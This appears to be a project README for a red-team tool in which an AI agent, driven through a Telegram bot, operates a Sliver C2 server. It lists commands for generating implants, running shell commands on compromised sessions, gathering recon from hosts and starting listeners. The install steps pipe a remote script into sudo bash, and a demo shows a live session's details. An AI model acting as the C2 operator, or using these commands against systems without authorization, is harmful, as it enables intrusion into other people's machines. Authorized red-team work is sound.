OpenclawC2 — AI-Controlled Red Team C2 via Telegram
Control your Sliver C2 server through a Telegram bot powered by an AI agent. No console. No SSH. Just chat.

What Is This?
ShadowC2 is a red team automation project that bridges the gap between a Sliver C2 server and a Telegram bot using an AI agent called Shadow (powered by OpenClaw).
Instead of SSHing into your server and typing commands in the Sliver console, you simply message your Telegram bot:

"see any active sessions"
"list files in /tmp on the session"
"give me system details of the affected machine"

Shadow reads the Sliver skill, runs the appropriate command, and replies with clean output — directly in Telegram.

Architecture:

Operator (Telegram)
        │
        ▼
  Telegram Bot (@RedTeaming_ai_bot)
        │
        ▼
  OpenClaw Gateway (Ubuntu Server)
  └── Shadow AI Agent
        │  reads SKILL.md
        ▼
  sliver_client.py (Python wrapper)
        │  uses --rc batch mode
        ▼
  Sliver Client (/usr/local/bin/sliver)
        │
        ▼
  Sliver Server (localhost:31337)
        │  HTTPS listener :443
        ▼
  Implant on Target Machine
  (LINGUISTIC_ANALYST — Kali Linux)

All components run on a single Ubuntu server. The operator controls everything remotely via Telegram.

Stack
ComponentToolPurposeC2 FrameworkSliver v1.7.3Command and control serverAI AgentOpenClaw + ShadowNatural language to Sliver commandsMessagingTelegram BotRemote operator interfaceWrappersliver_client.pyPython CLI bridge for SliverOSUbuntu ServerHost for all components

Features

Natural language control — tell Shadow what you want in plain English
Session management — list, interact with, and query active sessions
Live recon — get files, processes, system info, network details from compromised hosts
Listener management — start/stop HTTP, HTTPS, mTLS, DNS listeners
Implant generation — generate Linux/Windows/macOS implants on demand
Skill-based — Shadow reads a SKILL.md to know exactly how to use Sliver
Single machine setup — server, client, and agent all on one Ubuntu box


Project Structure
~/.openclaw/workspace/
├── sliver_client.py          # Python wrapper for Sliver CLI
├── skills/
│   └── sliver/
│       └── SKILL.md          # Shadow's Sliver instruction manual
├── SOUL.md                   # Agent identity and behavior
├── USER.md                   # Operator profile
└── TOOLS.md                  # Infrastructure notes

/usr/local/bin/
├── sliver                    # Sliver client binary
└── sliver-server             # Sliver server binary (at /root/)

Quick Start

1. Install Sliver
curl https://sliver.sh/install | sudo bash
2. Verify server is running
sudo systemctl status sliver
sliver-client version
3. Install OpenClaw
npm install -g openclaw
openclaw setup
4. Install the Sliver skill
mkdir -p ~/.openclaw/workspace/skills/sliver
cp SKILL.md ~/.openclaw/workspace/skills/sliver/
cp sliver_client.py ~/.openclaw/workspace/
5. Configure Telegram bot
openclaw channels login --channel telegram
6. Start the gateway
systemctl --user start openclaw-gateway.service
systemctl --user enable openclaw-gateway.service
8. Control via Telegram
Message your bot:
check C2 status
see active sessions
list files in /tmp on the session
give me system info of the affected machine
sliver_client.py Usage
# Check everything
python3 sliver_client.py status

# Listeners
python3 sliver_client.py jobs
python3 sliver_client.py listen --protocol https --lport 443

# Sessions & Beacons
python3 sliver_client.py sessions
python3 sliver_client.py beacons

# Implants
python3 sliver_client.py implants
python3 sliver_client.py generate NAME --os linux --arch amd64 --lhost IP --lport 443

# Execute on session
python3 sliver_client.py exec <session-id> whoami
python3 sliver_client.py exec <session-id> ls /tmp

Demo
Operator asks Shadow via Telegram:

"see any jobs are there"

Shadow responds:
C2 Status:
Jobs (Listeners):
- Job ID 1: HTTPS listener on port 443
Sessions: None active
Beacons: None active
Summary: One HTTPS listener is running and ready, but no implants have checked in yet.
After implant connects:

"see the active sessions and beacons"
Active Sessions:
- ID: 08e4d756
- Name: LINGUISTIC_ANALYST
- Transport: HTTP(S)
- Remote: 100.117.121.92:45638
- Hostname: kali
- User: botnoob
- OS: Linux/amd64
- Status: [ALIVE]

Security Notice
This project is built for authorized red team engagements and educational purposes only. Only use on systems you own or have explicit written permission to test. Unauthorized use is illegal.

License
MIT License — use responsibly.
Author
Built as part of a practical red team C2 project covering Sliver theory, installation, implant generation, and AI-driven operator automation.

License
MIT License — use responsibly.
